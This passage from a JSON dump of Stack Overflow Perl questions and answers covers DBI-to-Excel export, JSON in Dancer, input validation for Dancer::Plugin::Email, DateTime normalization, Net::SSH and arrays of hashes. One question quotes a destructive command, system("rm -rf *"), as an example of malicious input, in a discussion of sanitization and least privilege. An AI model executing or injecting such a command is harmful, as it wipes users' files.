{"reputation": 63, "user_id": 4625042, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/2156eab0e24e62fadbd8daac6d6fe0b5?s=128&d=identicon&r=PG", "display_name": "Erinna00", "link": "https://stackoverflow.com/users/4625042/erinna00"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1691, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1455061457, "creation_date": 1455059360, "last_edit_date": 1455060658, "question_id": 35304007, "link": "https://stackoverflow.com/questions/35304007/use-perl-to-select-data-from-sql-database-and-place-into-excel", "title": "Use Perl to select data from SQL database and place into Excel", "body": "<p>I am new to Perl so I'm hoping someone can help me with this\nI have two Perl scripts</p>\n\n<ol>\n<li><p>Connects to my sql2008 database and selects 2 columns from one table as an array and prints them using foreach.</p></li>\n<li><p>Uses Excel::Writer::XLSX to generate an Excel file with whatever strings I place in specific rows and columns. </p></li>\n</ol>\n\n<p>I would like to run script #1 and and have it output into an Excel file. I think I should just be able to combine these two scripts above but I keep getting \"requires explicit package\" errors. (I assume because my variables don't have <code>my</code> in front of them).  I must be way off. Looking for help. </p>\n\n<p>Here is my code that doesn't work:</p>\n\n<pre><code>use strict;\nuse DBI;\nuse Excel::Writer::XLSX;\n\n# connect to the db\nmy $dbh = DBI-&gt;connect('dbi:ODBC:dbname', 'dblogin', 'dbpassword');\n\n my $sth1 = $dbh-&gt;selectall_arrayref(\"\n select col1, col2 from table\");\n\nforeach my $ln (@$sth1) \n{ my($col1, $col2) = @$ln; print \"$col1  $col2\\n\";}\n\nmy $workbook  = Excel::Writer::XLSX-&gt;new( 'col1col2test.xlsx' );\nmy $worksheet = $workbook-&gt;add_worksheet();\n\n$worksheet-&gt;write( \"A1\", \"$col1\" );\n$worksheet-&gt;write( \"A2\", \"$col2\" );\n</code></pre>\n"}, {"tags": ["perl", "dancer"], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 5478464, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91a3fda3d7eed3ec64624793fdab4880?s=128&d=identicon&r=PG&f=1", "display_name": "Karlo E.", "link": "https://stackoverflow.com/users/5478464/karlo-e"}, "edited": false, "score": 0, "creation_date": 1455216620, "post_id": 35303595, "comment_id": 58402411, "body": "Thank you for the answer, and the side suggestion!"}], "tags": [], "owner": {"reputation": 1493, "user_id": 4399474, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/071244d72e3a6f73f9329753619eeb7c?s=128&d=identicon&r=PG", "display_name": "user52889", "link": "https://stackoverflow.com/users/4399474/user52889"}, "is_accepted": false, "score": 0, "last_activity_date": 1455058023, "last_edit_date": 1455058023, "creation_date": 1455057568, "answer_id": 35303595, "question_id": 35303424, "link": "https://stackoverflow.com/questions/35303424/how-to-receive-json-in-dancer/35303595#35303595", "title": "How to receive json in Dancer?", "body": "<p>Dancer provides the <a href=\"https://metacpan.org/pod/Dancer::Request#params-source\" rel=\"nofollow\"><code>params</code></a> keyword for accessing route, body, and query parameters. You want a body parameter. Exactly <em>which</em> body parameter you want will depend on the name of the field you posted it to the route with (look at your form or your ajax request).</p>\n\n<pre><code>my $json_string = params('body')-&gt;{$field_name}\n</code></pre>\n\n<p>You can also use <a href=\"https://metacpan.org/pod/Dancer#param\" rel=\"nofollow\"><code>param</code></a>, if you don't have any conflicting parameter names in the route or query parameters.</p>\n\n<p>Once you have the json, remember it's just a string at the moment. You might want to read it into a perl data structure: Dancer provides <a href=\"https://metacpan.org/pod/Dancer#from_json-structure-options\" rel=\"nofollow\"><code>from_json</code></a> for this purpose.</p>\n\n<p>As an aside: I notice in your get route, you call a function <code>loadgames</code> in void context, and then return a variable you haven't declared (or perhaps you have set it as a global - but do you need it to be a global?). I recommend beginning each perl file with <code>use strict;</code> to pick up issues like this. I suspect you probably just want to use the return value of <code>loadgames</code> as your return value.</p>\n"}, {"comments": [{"owner": {"reputation": 23, "user_id": 5478464, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91a3fda3d7eed3ec64624793fdab4880?s=128&d=identicon&r=PG&f=1", "display_name": "Karlo E.", "link": "https://stackoverflow.com/users/5478464/karlo-e"}, "edited": false, "score": 0, "creation_date": 1455216652, "post_id": 35305779, "comment_id": 58402429, "body": "Thank you! I definitely used the <code>from_json</code>"}], "tags": [], "owner": {"reputation": 6468, "user_id": 293652, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/820308d5db420d7f0e1d0ba97e09f520?s=128&d=identicon&r=PG", "display_name": "Grant McLean", "link": "https://stackoverflow.com/users/293652/grant-mclean"}, "is_accepted": false, "score": 2, "last_activity_date": 1455070903, "creation_date": 1455070903, "answer_id": 35305779, "question_id": 35303424, "link": "https://stackoverflow.com/questions/35303424/how-to-receive-json-in-dancer/35305779#35305779", "title": "How to receive json in Dancer?", "body": "<p>If your HTTP request has a JSON body (<code>Content-type: application/json</code>) rather than being an HTML form post, then you probably want something like this:</p>\n\n<pre><code>post '/url-path' =&gt; {\n    my $post = from_json( request-&gt;body );\n    # do something with the POSTed data structure\n    # which would typically be a hashref (or an arrayref)\n    # e.g.: schema-&gt;resultset('Widget')-&gt;create($post);\n}\n</code></pre>\n\n<p>The <code>from_json</code> routine is one of the <a href=\"https://metacpan.org/pod/distribution/Dancer2/lib/Dancer2/Manual.pod#DSL-KEYWORDS\" rel=\"nofollow\">DSL Keywords</a> provided by Dancer.</p>\n"}], "owner": {"reputation": 23, "user_id": 5478464, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/91a3fda3d7eed3ec64624793fdab4880?s=128&d=identicon&r=PG&f=1", "display_name": "Karlo E.", "link": "https://stackoverflow.com/users/5478464/karlo-e"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1079, "favorite_count": 1, "answer_count": 2, "score": 2, "last_activity_date": 1455070903, "creation_date": 1455056852, "question_id": 35303424, "link": "https://stackoverflow.com/questions/35303424/how-to-receive-json-in-dancer", "title": "How to receive json in Dancer?", "body": "<p>I am very new to Perl framework Dancer. As of now I have a get http listener working. I have an Angular framework trying to post a json string to Dancer. How can I retreive the json and perhaps assign it to a scalar variable ($json).</p>\n\n<pre><code>get '/games' =&gt; sub {\n    header 'Access-Control-Allow-Origin' =&gt; '*';\n    &amp;loadgames();\n    return $games;\n};\n\npost '/newgame' =&gt; sub {\n    header 'Access-Control-Allow-Origin' =&gt; '*';\n    #what should i put here to retrieve the json string\n    #I plan to pass the json string to a sub to convert to XML\n};\n</code></pre>\n\n<p>I am not sure If I chose Dancer as backend framework that will get and post data.</p>\n\n<p>Thanks for the help!</p>\n"}, {"tags": ["perl", "webserver", "dancer"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1455050853, "post_id": 35301657, "comment_id": 58313907, "body": "You should <i>always</i> sanitize user input, whether taint mode is enabled or not."}], "answers": [{"tags": [], "owner": {"reputation": 1493, "user_id": 4399474, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/071244d72e3a6f73f9329753619eeb7c?s=128&d=identicon&r=PG", "display_name": "user52889", "link": "https://stackoverflow.com/users/4399474/user52889"}, "is_accepted": false, "score": 1, "last_activity_date": 1455059125, "creation_date": 1455059125, "answer_id": 35303937, "question_id": 35301657, "link": "https://stackoverflow.com/questions/35301657/dancerpluginemail-module-is-data-tainted/35303937#35303937", "title": "Dancer::Plugin::Email module - Is data tainted?", "body": "<p>I am not aware of any way to use Dancer::Plugin::Email to run arbitrary commands, and if there was one, you'd probably find it in <a href=\"https://metacpan.org/pod/Email::Sender\" rel=\"nofollow\">Email::Sender</a>, which is what talks to <code>sendmail</code>. Running arbitrary commands by passing plain arguments to Email::Sender would definitely be a bug.</p>\n\n<blockquote>\n  <p>should you check the user input for malicious data</p>\n</blockquote>\n\n<p>No, you should check the user input meets the criteria you set. </p>\n\n<p>The distinction is important.</p>\n\n<p>For a route which causes email to be sent, make sure that as much data as possible comes from sources you trust (i.e. not the request), and only request/user user input where there's a good reason to.</p>\n\n<blockquote>\n  <p>Is that why it is recommended to run the webserver as a limited privilege user?</p>\n</blockquote>\n\n<p>It is good practice to execute code - especially public-facing web apps - with the minimum privileges, not because there are known security holes, but because there may be holes that you do not know about.</p>\n"}], "owner": {"reputation": 642, "user_id": 1498827, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/1fd718fa88dfbe25b406c8004551f02a?s=128&d=identicon&r=PG", "display_name": "microwth", "link": "https://stackoverflow.com/users/1498827/microwth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1455059125, "creation_date": 1455050099, "last_edit_date": 1455052108, "question_id": 35301657, "link": "https://stackoverflow.com/questions/35301657/dancerpluginemail-module-is-data-tainted", "title": "Dancer::Plugin::Email module - Is data tainted?", "body": "<p>When using the <a href=\"https://metacpan.org/pod/Dancer::Plugin::Email\" rel=\"nofollow\">Dancer::Plugin::Email</a> module,should you check the user input for malicious data or is the input automatically tainted etc? </p>\n\n<p>Although Dancer specific, does in the general case that the server runs as root and the untrusted user input passes a system(\"rm -rf *\") or something along those lines that is then fed to the sendmail executable pose a risk and opens the can of worms?</p>\n\n<p>Is that why it is recommended to run the webserver as a limited privilege user?</p>\n"}, {"tags": ["perl", "datetime"], "comments": [{"owner": {"reputation": 2464, "user_id": 494631, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/20649650b6209254e570442e953a8f5f?s=128&d=identicon&r=PG", "display_name": "baldr", "link": "https://stackoverflow.com/users/494631/baldr"}, "reply_to_user": {"reputation": 4120, "user_id": 9719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIDSQ.png?s=128&g=1", "display_name": "darch", "link": "https://stackoverflow.com/users/9719/darch"}, "edited": false, "score": 0, "creation_date": 1455050080, "post_id": 35301398, "comment_id": 58313460, "body": "It <i>can</i> be reassigned from the command-line parameter, but I think it is expected to be of the same format. Command-line parameter might be not passed, so the variable remains unchanged until these 3 lines."}, {"owner": {"reputation": 4120, "user_id": 9719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIDSQ.png?s=128&g=1", "display_name": "darch", "link": "https://stackoverflow.com/users/9719/darch"}, "edited": false, "score": 1, "creation_date": 1455050959, "post_id": 35301398, "comment_id": 58313982, "body": "There are different <code>str2time</code>s that could be used.  Is this one being imported from <code>Date::Parse</code> or some other library?"}, {"owner": {"reputation": 2464, "user_id": 494631, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/20649650b6209254e570442e953a8f5f?s=128&d=identicon&r=PG", "display_name": "baldr", "link": "https://stackoverflow.com/users/494631/baldr"}, "reply_to_user": {"reputation": 4120, "user_id": 9719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIDSQ.png?s=128&g=1", "display_name": "darch", "link": "https://stackoverflow.com/users/9719/darch"}, "edited": false, "score": 0, "creation_date": 1455051329, "post_id": 35301398, "comment_id": 58314216, "body": "I am not so familiar with Perl, but in the beginning I see <code>use DateTime; use Date::Parse;</code>. Have no idea where it can be imported from also."}, {"owner": {"reputation": 2464, "user_id": 494631, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/20649650b6209254e570442e953a8f5f?s=128&d=identicon&r=PG", "display_name": "baldr", "link": "https://stackoverflow.com/users/494631/baldr"}, "reply_to_user": {"reputation": 4120, "user_id": 9719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIDSQ.png?s=128&g=1", "display_name": "darch", "link": "https://stackoverflow.com/users/9719/darch"}, "edited": false, "score": 0, "creation_date": 1455053537, "post_id": 35301398, "comment_id": 58315479, "body": "Added some more code, but I don&#39;t think it is helpful."}, {"owner": {"reputation": 4120, "user_id": 9719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIDSQ.png?s=128&g=1", "display_name": "darch", "link": "https://stackoverflow.com/users/9719/darch"}, "edited": false, "score": 1, "creation_date": 1455058957, "post_id": 35301398, "comment_id": 58318178, "body": "The addition shows that my answer below is definitively wrong."}, {"owner": {"reputation": 2464, "user_id": 494631, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/20649650b6209254e570442e953a8f5f?s=128&d=identicon&r=PG", "display_name": "baldr", "link": "https://stackoverflow.com/users/494631/baldr"}, "reply_to_user": {"reputation": 4120, "user_id": 9719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIDSQ.png?s=128&g=1", "display_name": "darch", "link": "https://stackoverflow.com/users/9719/darch"}, "edited": false, "score": 0, "creation_date": 1455059848, "post_id": 35301398, "comment_id": 58318505, "body": "Really? I removed the mark, you can withdraw it."}], "answers": [{"comments": [{"owner": {"reputation": 2464, "user_id": 494631, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/20649650b6209254e570442e953a8f5f?s=128&d=identicon&r=PG", "display_name": "baldr", "link": "https://stackoverflow.com/users/494631/baldr"}, "edited": false, "score": 0, "creation_date": 1455086564, "post_id": 35305215, "comment_id": 58326573, "body": "Thank you for your efforts"}], "tags": [], "owner": {"reputation": 4120, "user_id": 9719, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EIDSQ.png?s=128&g=1", "display_name": "darch", "link": "https://stackoverflow.com/users/9719/darch"}, "is_accepted": true, "score": 2, "last_activity_date": 1455078097, "last_edit_date": 1455078097, "creation_date": 1455066765, "answer_id": 35305215, "question_id": 35301398, "link": "https://stackoverflow.com/questions/35301398/is-there-any-point-to-this-code-that-translates-a-strftime-into-a-time-and-then/35305215#35305215", "title": "Is there any point to this code that translates a strftime into a time and then back into a string?", "body": "<p>Normalization.  Those lines are providing normalization of user input.</p>\n\n<p>You see, <code>Date::Parse::str2time</code> can accept input in a <a href=\"http://search.cpan.org/~gbarr/TimeDate-2.30/lib/Date/Parse.pm#EXAMPLE_DATES\" rel=\"nofollow\">wide variety of formats </a>.  By parsing the user input and then turning it back into a string, we can guarantee that we use a consistent format internally.</p>\n\n<p>The existing code can be restructured into this equivalent formulation:</p>\n\n<pre><code>my %opts;\nmy $opt_string = 'ahropuc:i:s:e:t:';\ngetopts( \"$opt_string\", \\%opts );\n\nmy $start_time;\n\n# use the time specified on the command line or 'yesterday'\nif ( $opts{a} and $opts{s} ) {\n    my $start_time_string = $opts{s};\n    my $epoch = Date::Parse::str2time( $start_time_string, \"GMT\" );\n    $start_time = DateTime-&gt;from_epoch( epoch =&gt; $epoch );\n} else {\n    $start_time = DateTime-&gt;now-&gt;subtract( days =&gt; 1 );\n} \n\n# should be called $start_date_string, but keep the old name\n# so that we could just drop this code into place\nmy $start_date = $start_time-&gt;strftime(\"%Y-%m-%d\");\n</code></pre>\n\n<p>If you are not worried about accepting user input, you should be able to safely remove the lines that perform the normalization.</p>\n"}], "owner": {"reputation": 2464, "user_id": 494631, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/20649650b6209254e570442e953a8f5f?s=128&d=identicon&r=PG", "display_name": "baldr", "link": "https://stackoverflow.com/users/494631/baldr"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "accepted_answer_id": 35305215, "answer_count": 1, "score": 1, "last_activity_date": 1455078097, "creation_date": 1455049172, "last_edit_date": 1455053476, "question_id": 35301398, "link": "https://stackoverflow.com/questions/35301398/is-there-any-point-to-this-code-that-translates-a-strftime-into-a-time-and-then", "title": "Is there any point to this code that translates a strftime into a time and then back into a string?", "body": "<p>I am converting some scripts from Perl to Python. I have a piece of code that looks weird.</p>\n\n<pre><code>my $dt         = DateTime-&gt;now-&gt;subtract( days =&gt; 1 );\nmy $start_time = $dt-&gt;strftime(\"%Y-%m-%d\");\n# ... &lt;some code here&gt;\nmy $epoch = str2time( $start_time, \"GMT\" );\nmy $start_dt = DateTime-&gt;from_epoch( epoch =&gt; $epoch );\nmy $start_date = $start_dt-&gt;strftime(\"%Y-%m-%d\");\n</code></pre>\n\n<p>And here I have a question about <code>start_time</code> and <code>start_date</code>.</p>\n\n<p>Does it make sense to perform these last three lines? </p>\n\n<p>UPDATE:</p>\n\n<p>@darch asked to add any useful code related to <code>start_time</code>. I don't think it is useful, but here it is (removed not significant lines):</p>\n\n<pre><code>my %opts;\nmy $opt_string = 'ahropuc:i:s:e:t:';\ngetopts( \"$opt_string\", \\%opts );\n\nmy $start_time = $dt-&gt;strftime(\"%Y-%m-%d\");\n\nif ( $opts{a} ) {\n    if ( $opts{s} ) {\n        $start_time = $opts{s};\n    }\n}\n\nmy $epoch = str2time( $start_time, \"GMT\" );\nmy $start_dt = DateTime-&gt;from_epoch( epoch =&gt; $epoch );\nmy $start_date = $start_dt-&gt;strftime(\"%Y-%m-%d\");\n</code></pre>\n\n<p>The only reasonable answer is validation as answered below.</p>\n\n<p>I am going to rewrite this part to exclude user input, so if it is and this part is meaningless - I simply cut it.</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 4, "last_activity_date": 1455044025, "creation_date": 1455044025, "answer_id": 35299960, "question_id": 35299699, "link": "https://stackoverflow.com/questions/35299699/how-to-make-a-single-variable-perform-as-a-script/35299960#35299960", "title": "How to make a single variable perform as a script", "body": "<p>Manually printing headers to <code>sendmail</code> is no longer a good way to send email. <a href=\"https://en.wikipedia.org/wiki/Anti-spam_techniques#Automated_techniques_for_email_administrators\" rel=\"nofollow\">Modern email contains multiple, complicated guards against spammers</a>. Most mail servers and clients will reject your mail as spam.</p>\n\n<p>There's no reason the email has to be sent on the remote server.  Instead, send the mail via a normal SMTP connection.  Consider using <a href=\"https://metacpan.org/pod/Email::Sender\" rel=\"nofollow\">Email::Sender</a> instead.</p>\n\n<p>If you absolutely <em>must</em> send the mail from the remote server, write a script to do it (also using Email::Sender) and invoke that script.</p>\n"}], "owner": {"reputation": 497, "user_id": 5429268, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/1d8fb81137e25eb9629f65eb1b3f2a14?s=128&d=identicon&r=PG&f=1", "display_name": "BioRod", "link": "https://stackoverflow.com/users/5429268/biorod"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 32, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1455044025, "creation_date": 1455043254, "question_id": 35299699, "link": "https://stackoverflow.com/questions/35299699/how-to-make-a-single-variable-perform-as-a-script", "title": "How to make a single variable perform as a script", "body": "<p>I've been using this module to write simple scripts to log into a server and perform a single command.</p>\n\n<pre><code>use Net::SSH qw(sshopen2);\nuse strict;\n\nmy $user = \"username\";\nmy $host = \"hostname\";\nmy $cmd = \"command\";\n\nsshopen2(\"$user\\@$host\", *READER, *WRITER, \"$cmd\") || die \"ssh: $!\";\n\nwhile (&lt;READER&gt;) {\n    chomp();\n    print \"$_\\n\";\n}\n\nclose(READER);\nclose(WRITER);\n</code></pre>\n\n<p>But I need the $cmd variable to perform this operation below.</p>\n\n<pre><code>my $dir = \"/srv/archive/$date\";\nmy $time = `date`;\n\nopen my $LOG, '&gt;&gt;', '/srv/archive/test.log';\n\nif ( ! -e $dir )\n\n{\nmy $to = 'xxxxx@xxxxx.com';\nmy $from = 'node0@example.com';\nmy $subject = '**DROP FILE TEST ALERT**';\nmy $message = \"Please check if the $date directory exists\";\n\nopen(MAIL, \"|/usr/sbin/sendmail -t\");\n\n# Email Header\nprint MAIL \"To: $to\\n\";\nprint MAIL \"From: $from\\n\";\nprint MAIL \"Subject: $subject\\n\\n\";\n# # Email Body\nprint MAIL $message;\nclose(MAIL);\nprint \"Email Sent Successfully\\n\"    ;\nprint $LOG \"$time (Bad)\";    \n\n}\n\nelse\n\n{\n\nprint \"The directory exists!\\n\";\nprint $LOG \"$time (Good)\\n\";\n\n}\n</code></pre>\n\n<p>The reason why I'm using this is because I am not allowed to execute a script inside the server. Thanks in advance.</p>\n"}, {"tags": ["arrays", "perl"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 6, "last_activity_date": 1455040324, "last_edit_date": 1455040324, "creation_date": 1455038384, "answer_id": 35298179, "question_id": 35298096, "link": "https://stackoverflow.com/questions/35298096/perl-change-element-s-in-two-dimensional-array/35298179#35298179", "title": "Perl: change element/s in two dimensional array", "body": "<p>What you have there is called an array of hashes. More precisely, what you have there is an array of references to hashes. That means</p>\n\n<pre><code>$clothes[3]\n</code></pre>\n\n<p>is a reference to a hash, so</p>\n\n<pre><code>$clothes[3]-&gt;{price}\n</code></pre>\n\n<p>is the value of the <code>price</code> element of that hash. The <code>-&gt;</code> can be omitted between indexes, so the following is equivalent:</p>\n\n<pre><code>$clothes[3]{price}\n</code></pre>\n\n<p>That means you want</p>\n\n<pre><code>$clothes[3]{price} = 45;\n</code></pre>\n\n<hr>\n\n<p>If you don't know the index of the element you want, you can scan the array. Remember that each element of the array is a reference to one of the hashes.</p>\n\n<pre><code>for my $clothes_item (@clothes) {\n    if ($clothes_item-&gt;{item} eq 'Suit') {\n       $clothes_item-&gt;{price} = 45;\n    }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 4, "creation_date": 1455039458, "post_id": 35298189, "comment_id": 58307253, "body": "@MattJacob All items 99 cents, everything must go!"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1455039492, "post_id": 35298189, "comment_id": 58307269, "body": "@ThisSuitIsBlackNot Hahaha"}], "tags": [], "owner": {"reputation": 862, "user_id": 3586150, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/1f0969599955a953e592034929ed7a23?s=128&d=identicon&r=PG", "display_name": "Neil H Watson", "link": "https://stackoverflow.com/users/3586150/neil-h-watson"}, "is_accepted": false, "score": 0, "last_activity_date": 1455038414, "creation_date": 1455038414, "answer_id": 35298189, "question_id": 35298096, "link": "https://stackoverflow.com/questions/35298096/perl-change-element-s-in-two-dimensional-array/35298189#35298189", "title": "Perl: change element/s in two dimensional array", "body": "<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\nmy @clothes = \n    (\n        {item =&gt; 'Jeans', colour =&gt; 'Blue', price =&gt; 50},\n        {item =&gt; 'Shawl', colour =&gt; 'Red', price =&gt; 30},\n        {item =&gt; 'Blazer', colour =&gt; 'Brown', price =&gt; 100},\n        {item =&gt; 'Suit', colour =&gt; 'Black', price =&gt; 40},\n        {item =&gt; 'Top', colour =&gt; 'White', price =&gt; 25}    \n    );\n\nfor my $next_item ( @clothes ){\n        $next_item-&gt;{price} = 0.99\n}\n\nprint Dumper( \\@clothes );\n</code></pre>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5642621"}, "edited": false, "score": 0, "creation_date": 1455038964, "post_id": 35298243, "comment_id": 58306954, "body": "Exactly what I was looking for"}], "tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": true, "score": 4, "last_activity_date": 1455039329, "last_edit_date": 1455039329, "creation_date": 1455038550, "answer_id": 35298243, "question_id": 35298096, "link": "https://stackoverflow.com/questions/35298096/perl-change-element-s-in-two-dimensional-array/35298243#35298243", "title": "Perl: change element/s in two dimensional array", "body": "<p>You don't have a two-dimensional array---you have an array of hashrefs. If you wanted to change the price of a specific item, you would need to know the array index that holds the hash reference it belongs to.</p>\n\n<pre><code>$clothes[1]-&gt;{price} = 42;\n</code></pre>\n\n<p>For additional things you can do with your array of hashes, see the aptly named <a href=\"http://perldoc.perl.org/perldsc.html#ARRAYS-OF-HASHES\" rel=\"nofollow\">Arrays of Hashes</a> section of <a href=\"http://perldoc.perl.org/perldsc.html\" rel=\"nofollow\">perldsc</a>.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5642621"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 0, "accepted_answer_id": 35298243, "answer_count": 3, "score": 1, "last_activity_date": 1455042036, "creation_date": 1455038085, "last_edit_date": 1455042036, "question_id": 35298096, "link": "https://stackoverflow.com/questions/35298096/perl-change-element-s-in-two-dimensional-array", "title": "Perl: change element/s in two dimensional array", "body": "<p>How do I change an element/s in a two dimensional array in perl?</p>\n\n<p>Suppose I have the following array and want to change the price of an item:</p>\n\n<pre><code>my @clothes = (\n    { item =&gt; 'Jeans',  colour =&gt; 'Blue',  price =&gt; 50 },\n    { item =&gt; 'Shawl',  colour =&gt; 'Red',   price =&gt; 30 },\n    { item =&gt; 'Blazer', colour =&gt; 'Brown', price =&gt; 100 },\n    { item =&gt; 'Suit',   colour =&gt; 'Black', price =&gt; 40 },\n    { item =&gt; 'Top',    colour =&gt; 'White', price =&gt; 25 }\n);\n</code></pre>\n"}, {"tags": ["perl", "stat", "solaris-10"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1455038202, "post_id": 35298033, "comment_id": 58306438, "body": "What do you mean by &quot;calling &#39;stat&#39; from the command-line&quot;? The <code>stat</code> Perl function can only be called from within a Perl program (such as the one you posted)."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 2, "creation_date": 1455038740, "post_id": 35298033, "comment_id": 58306780, "body": "<a href=\"http://p3rl.org/stat\" rel=\"nofollow noreferrer\">stat</a> is not <a href=\"http://linux.die.net/man/1/stat\" rel=\"nofollow noreferrer\">stat</a>."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1455054801, "post_id": 35298033, "comment_id": 58316168, "body": "You can replicate <code>stat</code> on solaris with <code>truss</code>. Off the top of my head, something like <code>truss -t lstat64 -v lstat64 ls &lt;path&#47;file&gt;</code>"}, {"owner": {"reputation": 33, "user_id": 1649114, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/924cf25d754a92a54fa6c874b0b2171e?s=128&d=identicon&r=PG", "display_name": "user1649114", "link": "https://stackoverflow.com/users/1649114/user1649114"}, "edited": false, "score": 0, "creation_date": 1455095125, "post_id": 35298033, "comment_id": 58330899, "body": "I though the stat comman in perl in the one you see in the man page. Therefore on my bash prompt I just tried to call &#39;stat&#39; but I haven&#39;t it installed. So I want to know if perl is actually calling the system command &#39;stat&#39; (I think it&#39;s the case) and if it&#39;s, is there a way for me to call it without using truss. I saw some pages where the &#39;stat&#39; command can be called from the shell prompt"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1455125874, "post_id": 35298033, "comment_id": 58352987, "body": "No, perl is not calling the external program <code>stat</code>, nor the shell built-in <code>stat</code>. It calls the <a href=\"http://linux.die.net/man/2/stat\" rel=\"nofollow noreferrer\">C library function <code>stat</code></a>. So no, you 